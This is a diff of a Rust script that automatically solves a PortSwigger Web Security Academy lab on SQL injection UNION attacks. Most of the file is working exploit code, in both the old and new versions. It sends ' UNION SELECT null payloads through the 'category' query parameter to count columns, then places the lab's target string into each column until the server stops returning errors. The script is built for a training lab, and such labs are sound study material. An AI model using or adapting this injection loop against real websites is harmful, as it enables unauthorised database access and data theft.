@@ -1,145 +1,68 @@
-/***********************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 18/9/2023
+/*****************************************************************************
 *
 * Lab: SQL injection UNION attack, finding a column containing text
 *
-* Steps: 1. Inject payload into 'category' query parameter to determine
-*           the number of columns
-*        2. Add one additional null column at a time
-*        3. Repeat this process, increasing the number of columns until you
-*           receive a valid response
-*        4. After determining the number of columns, replace each column with
-*           the desired text one at a time.
-*        5. Repeat this process until you receive a valid response.
+* Hack Steps: 
+*      1. Inject payload into 'category' query parameter to determine
+*         the number of columns
+*      2. Add one additional null column at a time
+*      3. Repeat this process, increasing the number of columns until you
+*         receive a valid response
+*      4. After determining the number of columns, replace each column with
+*         the desired text one at a time.
+*      5. Repeat this process until you receive a valid response.
 *
-************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+******************************************************************************/
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
-use select::{document::Document, predicate::Attr};
 use std::{
-    collections::HashMap,
     io::{self, Write},
     time::Duration,
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0aab008c0429371e813cd4be0012009e.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a3000d004754bfc81ef6c1f006d008e.web-security-academy.net";
+    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
+    flush_terminal();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let main_page = fetch("/");
+    let body = main_page.text().unwrap();
+    let target_text = capture_pattern_from_text("retrieve the string: '(.*)'", &body);
 
-    println!(
-        "{} {}",
-        "[#] Injection parameter:".blue(),
-        "category".yellow()
-    );
-    io::stdout().flush();
+    println!("⦗#⦘ Desired text: {}", target_text.blue());
+    flush_terminal();
 
-    // fetch the main pages
-    let main = client
-        .get(url)
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the main page".red()));
+    for counter in 1..10 {
+        let nulls = "null, ".repeat(counter);
+        let payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // remove the last comma to make the syntax valid
 
-    // get the body of the response
-    let body = main.text().unwrap();
+        println!("❯❯ Trying payload: {}", payload);
 
-    // extract the desired text
-    let desired_text = capture_pattern("Make the database retrieve the string: '(.*)'", &body)
-        .expect(&format!(
-            "{}",
-            "[!] Failed to extract the wanted text to return. this will be fixed after reseting the lab".red()
-        ));
+        let injection_response = fetch(&format!("/filter?category={payload}"));
+        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response) {
+            println!("⦗#⦘ Number of columns: {}", counter.to_string().green());
 
-    println!("{} {}", "[#] Desired text:".blue(), desired_text.yellow());
-    io::stdout().flush();
-
-    for i in 1..10 {
-        // number of nulls
-        let nulls = "null, ".repeat(i);
-
-        // payload to retreive the number of columns
-        let mut payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // replace the last coma to make the syntax valid
-
-        println!("[*] Trying payload: {}", payload);
-
-        // fetch the page with the injected payload
-        let null_injection = client
-            .get(format!("{url}/filter?category={payload}"))
-            .send()
-            .expect(&format!(
-                "{}",
-                "[!] Failed to fetch the page with the injected payload to determine the number of columns"
-                    .red()
-            ));
-
-        // get the body of the response
-        let body = null_injection.text().unwrap();
-
-        // extract error text to determine if the payload is valid or not
-        let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
-
-        // if the error text doesn't exist
-        if internal_error.is_none() {
-            println!(
-                "[#] {}{}",
-                "Number of columns: ".white(),
-                i.to_string().green().bold()
-            );
-
-            for j in 1..i + 1 {
-                // copy the payload to work on the new copied one
-                // these formulas works only for this lab
+            for column in 1..counter + 1 {
                 let mut new_payload = payload.clone();
+                let start_index = 9 + 6 * column;
+                let end_index = (9 + 6 * column) + 4;
 
-                // start index to edit
-                let start = 9 + 6 * j;
+                new_payload.replace_range(start_index..end_index, &format!("'{target_text}'"));
 
-                // end index to edit
-                let end = (9 + 6 * j) + 4;
+                println!("❯❯ Trying payload: {}", new_payload);
 
-                // adjust the payload to check for a column containnig text
-                new_payload.replace_range(start..end, &format!("'{desired_text}'",));
-
-                println!("[*] Trying payload: {}", new_payload);
-
-                // fetch the page with the injected payload
-                let text_null_injection = client
-                    .get(format!("{url}/filter?category={new_payload}"))
-                    .send()
-                    .expect(&format!( "{}",
-                        "[!] Failed to fetch the page with the injected payload to determine the number of columns"
-                            .red()
-                    ));
-
-                // get the body of the response
-                let body = text_null_injection.text().unwrap();
-
-                // extract error text to determine if the payload is valid or not
-                let internal_error = extract_pattern("<h4>Internal Server Error</h4>", &body);
-
-                // if the error text doesn't exist
-                if internal_error.is_none() {
+                let injection_response = fetch(&format!("/filter?category={new_payload}"));
+                if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response)
+                {
                     println!(
-                        "[#] {}{}",
-                        "the column containing text: ".white(),
-                        j.to_string().green().bold()
+                        "⦗#⦘ the column containing text: {}",
+                        column.to_string().green()
                     );
 
                     break;
@@ -152,20 +75,27 @@ fn main() {
         }
     }
 
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn fetch(path: &str) -> Response {
+    let client = build_web_client();
+    client
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -173,26 +103,17 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*******************************************
-* Function to extract a pattern form a text
-********************************************/
-fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.find(text) {
-        Some(text.as_str().to_string())
+fn text_not_exist_in_response(text: &str, response: Response) -> bool {
+    let body = response.text().unwrap();
+    let regex = Regex::new(text).unwrap();
+    if regex.find(&body).is_none() {
+        true
     } else {
-        None
+        false
     }
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
